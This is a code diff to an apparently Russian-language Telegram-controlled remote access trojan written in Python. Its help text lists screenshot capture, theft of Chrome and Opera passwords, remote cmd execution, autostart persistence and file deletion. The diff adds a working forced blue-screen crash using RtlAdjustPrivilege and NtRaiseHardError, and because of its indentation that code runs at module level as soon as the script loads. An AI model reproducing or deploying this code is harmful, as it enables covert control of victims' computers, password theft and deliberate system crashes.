@@ -1,10 +1,15 @@
 import telebot
-import os 
 import requests 
 from PIL import ImageGrab 
 import shutil 
 import sqlite3 
 import win32crypt 
+from ctypes import windll 
+from ctypes import c_int 
+from ctypes import c_uint 
+from ctypes import c_ulong 
+from ctypes import POINTER 
+from ctypes import byref 
 import subprocess 
 import os, sys
 import platform 
@@ -24,7 +29,7 @@ def send_message(command):
     
 @bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) # Commands
 def send_message(command):
-    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /screamer - откроет ссылку на скример \n /kill_process name.exe - Убить процесс по имени" +
+    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /screamer - откроет ссылку на скример \n \n /bsod - Краш системы /kill_process name.exe - Убить процесс по имени" +
                     "\n /Pwd - Узнать текущую директорию \n /autostart - Добавить ратник в автостарт \n /passwords chrome - Пароли гугл хром \n /passwords opera - Пароли опера" +
                     "\n /Cmd command - Выполнить команду в cmd  \n /Open_url - Открыть ссылку \n /Ls - все папки и файлы в директории" +
                     "\n /Cd folder - перейти в папку \n /Download - скачать файл \n /Rm_dir - удалить папку" + 
@@ -45,6 +50,28 @@ def send_screamer(command) :
     bot.send_message(chat_id, "Wait...") 
     webbrowser.open('https://parad1st.github.io/Screamer/', new=2)
     bot.send_message(chat_id, "Successfully open screamer!") 
+
+@bot.message_handler(commands=['bsod', 'Bsod']) 
+def send_bsod(command) :
+    bot.send_message(chat_id, "Wait...") 
+
+nullptr = POINTER(c_int)() 
+windll.ntdll.RtlAdjustPrivilege( 
+    c_uint(19), 
+    c_uint(1), 
+    c_uint(0), 
+    byref(c_int()) 
+) 
+windll.ntdll.NtRaiseHardError( 
+    c_ulong(0xC000007B), 
+    c_ulong(0), 
+    nullptr, 
+    nullptr, 
+    c_uint(6), 
+    byref(c_uint()) 
+)
+
+bot.send_message(chat_id, "Successfully bsod!") 
 
 @bot.message_handler(commands=['autostart', 'Autostart']) 
 def send_autostart(command) :
